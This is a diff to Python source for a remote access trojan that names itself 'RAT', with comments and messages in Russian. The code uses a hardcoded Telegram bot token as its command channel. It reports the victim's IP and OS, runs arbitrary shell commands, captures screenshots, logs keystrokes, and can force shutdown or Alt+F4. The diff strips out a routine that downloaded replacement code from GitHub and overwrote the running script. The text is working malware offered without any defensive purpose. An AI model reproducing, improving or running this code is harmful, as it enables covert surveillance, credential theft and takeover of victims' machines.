@@ -1,7 +1,4 @@
-# build v1
-# trigger build
 import os
-import sys
 import time
 import requests
 import subprocess
@@ -9,29 +6,18 @@ import platform
 import pyautogui
 from pynput import keyboard
 
-# ===== НАСТРОЙКИ =====
 TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
 CHAT_ID = "7352598189"
-VERSION = "2.0"
-REPO_URL = "https://raw.githubusercontent.com/popask223-create/Tracked/main/rat_mm2.py"
 
-# ===== ОТПРАВКА В TELEGRAM =====
-def send_tg(msg, file=None):
+def send_tg(msg):
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        data = {"chat_id": CHAT_ID, "text": msg}
-        requests.post(url, json=data)
-        if file:
-            with open(file, 'rb') as f:
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
-                    data={"chat_id": CHAT_ID},
-                    files={"document": f}
-                )
+        requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": msg}
+        )
     except:
         pass
 
-# ===== СКРИНШОТ =====
 def screenshot():
     try:
         path = "screen.png"
@@ -40,7 +26,6 @@ def screenshot():
     except:
         return None
 
-# ===== ВЫПОЛНЕНИЕ КОМАНД =====
 def execute_cmd(cmd):
     try:
         r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
@@ -48,7 +33,6 @@ def execute_cmd(cmd):
     except:
         return "Ошибка"
 
-# ===== КЕЙЛОГГЕР =====
 def keylogger():
     logs = ""
     def on_press(key):
@@ -63,29 +47,12 @@ def keylogger():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-# ===== ОБНОВЛЕНИЕ =====
-def check_update():
-    try:
-        r = requests.get(REPO_URL, timeout=5)
-        if r.status_code == 200:
-            new_code = r.text
-            if "VERSION = \"2.1\"" in new_code and VERSION != "2.1":
-                with open(__file__, 'w', encoding='utf-8') as f:
-                    f.write(new_code)
-                send_tg("🔄 Обновлено до версии 2.1. Перезапуск...")
-                time.sleep(1)
-                os.execl(sys.executable, sys.executable, *sys.argv)
-    except:
-        pass
-
-# ===== ГЛАВНАЯ ФУНКЦИЯ =====
 def main():
-    send_tg(f"🖥️ RAT v{VERSION} запущен!\nIP: {requests.get('https://api.ipify.org').text}\nСистема: {platform.system()} {platform.release()}")
+    ip = requests.get("https://api.ipify.org").text
+    send_tg(f"🖥️ RAT запущен!\nIP: {ip}\nСистема: {platform.system()} {platform.release()}")
 
     while True:
         try:
-            check_update()
-
             url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
             updates = requests.get(url).json()
             if updates['result']:
@@ -102,13 +69,13 @@ def main():
                             send_tg("📸 Скриншот:", img)
                             os.remove(img)
                         else:
-                            send_tg("❌ Ошибка")
+                            send_tg("❌ Ошибка скриншота")
                     elif msg == '/shutdown':
                         execute_cmd("shutdown /s /t 5")
-                        send_tg("💻 ПК выключится через 5 сек")
+                        send_tg("💻 ПК выключается через 5 секунд!")
                     elif msg == '/altf4':
                         pyautogui.hotkey('alt', 'f4')
-                        send_tg("⌨️ Alt+F4 отправлен")
+                        send_tg("⌨️ Alt+F4 отправлен!")
             time.sleep(5)
         except:
             time.sleep(5)
